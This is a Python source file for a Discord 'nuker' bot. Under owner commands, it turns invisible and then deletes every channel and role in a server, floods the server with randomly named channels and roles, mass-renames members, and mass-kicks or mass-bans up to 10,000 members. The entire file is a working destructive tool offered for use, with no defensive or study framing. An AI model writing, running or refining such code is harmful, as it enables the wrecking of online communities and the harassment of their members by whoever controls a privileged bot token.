import discord, requests, random, string, asyncio, threading, json, time

class nuker(discord.Client):
    def __init__(self, token, prefix="!", invis=True, ownerid=None):
        self.token = token
        self.prefix = prefix
        self.infos = ["delchannels", "delroles", "masschannel", "massrole", "massnick", "masskick", "massban", "assignCmd"]
        self.commands = {
            
        }
        """
            "delchannels": "delchannels",
            "delroles": "delroles",
            "masschannel": "masschannel",
            "massrole": "massrole",
            "massnick": "massnick", 
            "masskick": "masskick",
            "massban": "massban"
        """
        self.bot = discord.Client(intents=discord.Intents.all())
        @self.bot.event
        async def on_ready():
            print('Nuker initiated.')
            if invis:
                await self.bot.change_presence(status=discord.Status.invisible)
        @self.bot.event
        async def on_message(msg):
            if ownerid != None:
                if msg.author.id != ownerid:
                    return

            if not msg.content.startswith(prefix):
                return

            command = msg.content.split(' ')[0][1:]
            args = msg.content.split(' ')[1:]

            if command == "assignCmd":
                try:
                    name = args[0]
                    cmdname = args[1]
                    self.assignCommand(cmdname, name)
                except Exception as e:
                    print(e)
                    pass
                return
            try:
                cmd = self.commands[command]
                if cmd == "delchannels":
                    for channel in msg.guild.channels:
                        self.createtask(channel.delete())

                if cmd == "delroles":
                    for role in msg.guild.roles:
                        self.createtask(role.delete())

                if cmd == "masschannel":
                    try:
                        amount = int(args[0])
                    except:
                        amount = 100
                    try:
                        args[1]
                        name = '-'.join(args[1:])
                    except:
                        name = "rand"
                    for i in range(amount):
                        if name == "rand":
                            n = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=100))
                        else:
                            n = name
                        self.createtask(msg.guild.create_text_channel(n))

                if cmd == "massrole":
                    try:
                        amount = int(args[0])
                    except:
                        amount = 50
                    try:
                        args[1]
                        name = '-'.join(args[1:])
                    except:
                        name = "rand"
                    for i in range(amount):
                        if name == "rand":
                            n = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=100))
                        else:
                            n = name
                        self.createtask(msg.guild.create_role(name=n))

                if cmd == "massnick":
                    try:
                        bog = msg.content.split(' ', 3)[1]
                        pre = msg.content.split(' ', 3)[2]
                        nick = msg.content.split(' ', 3)[3]
                        members = await msg.guild.fetch_members(limit=1000).flatten()
                        url = ''
                        if bog == "male":
                            url = 'http://names.drycodes.com/1000?nameOptions=boy_names'
                        elif bog == "female":
                            url = 'http://names.drycodes.com/1000?nameOptions=girl_names'
                        else:
                            url = 'http://names.drycodes.com/1000'
                        names = requests.get(
                            url=url
                        ).json()
                        namel = []
                        for name in names:
                            namel.append(name.replace('_', ' '))
                        x = 0
                        for m in members:
                            n = ''
                            if nick == "rand":
                                n = namel[x]
                            else:
                                n = nick
                            if pre == "*":
                                self.createtask(m.edit(nick=n))
                            else:
                                if m.name == pre:
                                    self.createtask(m.edit(nick=n))
                            x += 1
                    except Exception as e:
                        print(e)
                        pass
                
                if cmd == "masskick":
                    try:
                        args[0]
                        reason = ' '.join(args)
                    except:
                        reason = 'nuke'
                    members = await msg.guild.fetch_members(limit=10000).flatten()
                    for member in members:
                        self.createtask(member.kick(reason))

                if cmd == "massban":
                    try:
                        args[0]
                        reason = ' '.join(args)
                    except:
                        reason = 'nuke'
                    members = await msg.guild.fetch_members(limit=10000).flatten()
                    for member in members:
                        self.createtask(member.ban(reason=reason))

                
            except:
                return
    def createtask(self, task):
        try:
            asyncio.create_task(task)
        except Exception as e:
            print(e)
            pass
    def thread(self, target, args):
        threading.Thread(target=target, args=args).start()
    def route(self, method, path, body=None):
        func = getattr(requests, method.lower())
        if body == None:
            return func(
                url=f"https://discord.com/api/v8{path}",
                headers={
                    "Authorization": "Bot " + self.token
                }
            ).json()
        else:
            return func(
                url=f"https://discord.com/api/v8{path}",
                headers={
                    "Authorization": "Bot " + self.token
                },
                json=body
            ).json()
    def assignCommand(self, command, name):
        if command in self.infos:
            self.commands[name] = command
        else:
            raise Exception('invalid command')
    def run(self):
        self.bot.run(self.token)